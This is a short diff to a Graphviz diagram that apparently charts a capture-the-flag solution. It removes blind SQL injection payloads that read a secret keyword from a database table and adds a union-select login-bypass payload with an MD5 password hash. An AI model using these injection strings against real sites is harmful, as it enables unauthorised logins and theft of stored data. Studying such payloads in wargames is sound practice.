@@ -20,10 +20,8 @@
             "server"[shape="plaintext"];
             "server" -> step1 -> step3 -> step5 -> step7 -> step9;
         }
-        step0 -> step1[label="level4.php?id=1 and if((select length(keyword) from level4_secret)=%s,1,0)",arrowhead="normal"];
-        step3 -> step2[label="column length",arrowhead="normal"];
-        step4 -> step5[label="level4.php?id=1 and if((select substring(keyword,%s,1) from level4_secret)=%s,1,0)",arrowhead="normal"];
-        step7 -> step6[label="@solve",arrowhead="normal"];
+        step0 -> step1[label="username=' union select 'joizel','0cc175b9c0f1b6a831c399e269772661&password=a&login=Login",arrowhead="normal"];
+        step3 -> step2[label="@solve",arrowhead="normal"];
     }
 
 |
